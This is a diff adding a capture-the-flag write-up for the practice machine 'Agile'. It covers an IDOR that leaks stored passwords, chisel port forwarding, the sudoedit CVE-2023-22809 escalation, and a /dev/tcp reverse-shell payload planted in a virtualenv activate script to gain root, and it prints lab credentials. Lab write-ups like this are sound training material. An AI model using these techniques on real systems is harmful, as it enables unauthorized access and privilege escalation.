@@ -262,7 +262,7 @@ Link:http://superpass.htb/vault/row/3
 
 Now, this presented us with a ```website```, ```username```, and a ```password```. 
 
-Trying other directories burp intruder gave us, I tried 4 next
+Trying other directories burp intruder gave us, I tried ```4``` next
 
 Link:http://superpass.htb/vault/row/4
 
@@ -277,15 +277,151 @@ If the application fails to properly authenticate and authorize user access to t
 To exploit this we'll be using burp intruder to fuzz 
 
 ![image](https://user-images.githubusercontent.com/67879936/224588282-08667bc4-3634-4280-ac9e-e6edcf8290f1.png)
+![image](https://user-images.githubusercontent.com/67879936/224588558-1724f1a1-f8b6-4737-bc10-a272bc9cc244.png)
+
+The result
+
+![image](https://user-images.githubusercontent.com/67879936/224588658-ea1285e3-a04a-4dad-9057-2867ebbca7bc.png)
+
+using ```7``` and ```8```
+
+Link:http://superpass.htb/vault/row/7
+
+Link:http://superpass.htb/vault/row/8
+
+![image](https://user-images.githubusercontent.com/67879936/224588834-404bcff1-0443-4ccc-b0f8-92d6d9779511.png)
+![image](https://user-images.githubusercontent.com/67879936/224588889-f82223c6-6587-4f5a-969b-f8993e86bbf0.png)
+
+cool, we got creds for user ```corum```, if you recall user ```corum``` was found in the /etc/passwd file we downloaded earlier. This means we can try to login to the ssh server using this credentials. We'll be using the credentials in ```row 8``` and this is because it has user ```corum``` and the name of the website is ```agile``` (which is also the name of the box we are working on).
+
+
+```username:corum```          ```password:5db7caa1d13cc37c9fc2```
+
+
+![image](https://user-images.githubusercontent.com/67879936/224589382-c1099339-8613-43ff-99c7-03fe60da4acb.png)
+
+cool, we got a shell as user ```corum```. Lets go ahead and escalate our privileges.
 
 
 
 
+<h2>Privilege Escalation</h2>
+
+Running ```netstat -tuln``` I got a list of all open TCP and UDP ports on the system, along with the process ID and name that is using each port
+
+![image](https://user-images.githubusercontent.com/67879936/224590014-2a160ffc-ff5c-4c62-8d95-0c2f8a9a521b.png)
+
+During my enumeration I found out that port 5555 is running on a webpage similar to the webpage running on port 80. So, to access this webserver we are going to do a bit of portforwarding. We'll be using a tool called chisel to do this. Lets send the tool to the target's machine
+
+![image](https://user-images.githubusercontent.com/67879936/224590488-9523be1e-5d63-4afb-8cdb-d2b50bb8d566.png)
+![image](https://user-images.githubusercontent.com/67879936/224590532-e0ee0e2a-756c-48fc-ac36-343ce19d63f3.png)
+
+cool, now lets go ahead and run this toool.
+
+>command: chisel server -p 9001 --reverse (run this on your machine)
+>command: chisel client <ur ip>:9001 R:80:10.150.150.222:80 (run this on the target's machine)
+
+![image](https://user-images.githubusercontent.com/67879936/224591076-c9446ace-b81c-4add-b619-d45e49c0600c.png)
+![image](https://user-images.githubusercontent.com/67879936/224591053-8e73902d-3906-4677-ac7e-2b4710d37d2f.png)
+
+Now, lets navigate to the webpage
+
+Link:http://127.0.0.1:5555
+
+![image](https://user-images.githubusercontent.com/67879936/224591218-9b54c852-3127-4306-abe1-e4af2db3c590.png)
+
+cool, we'll repeat the same steps we did earlier during our enumeration. That is, we'll create an account then try to view the ```/row``` directory again with the column numbers
+
+![image](https://user-images.githubusercontent.com/67879936/224591510-15c56df4-9211-4bdd-8fa5-57b78644141c.png)
+![image](https://user-images.githubusercontent.com/67879936/224591585-224085e9-58ab-4def-8122-21d31d59462a.png)
+
+The same IDOR vulnerability is also present in this webpage which made us had aceess to ```Edwards``` password. We'll try to login to the ssh server using this credentials
+
+```username:edwards```      ```password:d07867c6267dcb5df0af```
+
+![image](https://user-images.githubusercontent.com/67879936/224591780-65c3f278-485a-4d14-a387-e811bf704f5e.png)
+
+cool, we got a shell as user ```edwards```, now lets further  escalate our privileges
 
 
+Running the ```sudo -l``` command, I found something interesting
+
+![image](https://user-images.githubusercontent.com/67879936/224591917-de989c76-db8a-49b5-afae-c7a169f44ed0.png)
+
+User ```edwards``` has the permission to edit those  files as user ```dev_admin```. We'll be making use of this to further escalate our privileges.
+
+The first file contains credentials for the mysql server
+
+>command: sudo -u dev_admin sudoedit /app/config_test.json
+
+![image](https://user-images.githubusercontent.com/67879936/224592455-62c5f661-fb59-4587-98ea-ef0d44013234.png)
+
+Trust me, I checked the mysql server and there was nothing there lool
+
+The second file contains creds for user edwards
+
+>command: sudo -u dev_admin sudoedit  /app/app-testing/tests/functional/creds.txt
+
+![image](https://user-images.githubusercontent.com/67879936/224592749-442391cb-8436-4141-8ce3-84445d0c28ab.png)
+
+I think this creds was here to just troll us xD
+
+Moving on, I went ahead to look for exploits on sudo edit and i found this
+
+Link:https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc
+
+![image](https://user-images.githubusercontent.com/67879936/224593347-b279a641-2d46-4bb9-8866-c41e6f319e23.png)
+![image](https://user-images.githubusercontent.com/67879936/224593401-4c6ed07a-c62f-4cca-a135-9d5b5fb36506.png)
+
+That line shows the exploit that is being ran
+
+```EDITOR="vim -- /etc/sudoers" $EXPLOITABLE```
+
+So with this we can read any files that belongs to user ```dev_admin```. Searching for writable files I found something
+
+![image](https://user-images.githubusercontent.com/67879936/224595134-3b679002-ec74-47e6-83cb-41cc968083ce.png)
+
+I ran linpeas and saw that user ```dev_admin``` has permission to write to that file
+
+![image](https://user-images.githubusercontent.com/67879936/224595287-4cfbd90d-3baa-4e41-9419-181dc420d97d.png)
+
+Now, this looks like a virtual environment. So, we can use this to escalate our privileges. 
+
+To exploit this we'll be inserting our payload into the file
+
+payload:```/bin/bash -l > /dev/tcp/10.10.15.16/1234 0<&1 2>&1```
+
+Ensure you change the $IP and $Port
 
 
+Lets insert that payload into the file
 
+>command: EDITOR="vi -- /app/venv/bin/activate" sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
+
+![image](https://user-images.githubusercontent.com/67879936/224596161-340c81b2-d49a-45ec-8b80-2ae1919a9616.png)
+
+Ensure this file is properly saved after adding your payload.
+
+Our payload will be executed if we try switching to the virtual environment, before we switch set up your netcat listener
+
+>command: rlwrap nc -nvlp 1234
+
+To switch to the virtual environment
+
+>command: source activate
+
+![image](https://user-images.githubusercontent.com/67879936/224596651-d679ff9b-8c44-4da4-95c0-91ec70e8d9f4.png)
+
+checking our listener
+
+![image](https://user-images.githubusercontent.com/67879936/224596731-9055df88-789c-4667-8fd8-0b4ebd6c0bf3.png)
+
+Boom!!! We got a root shell.
+
+
+That will be all for today
+<br> <br>
+[Back To Home](../../index.md)
 
 
 
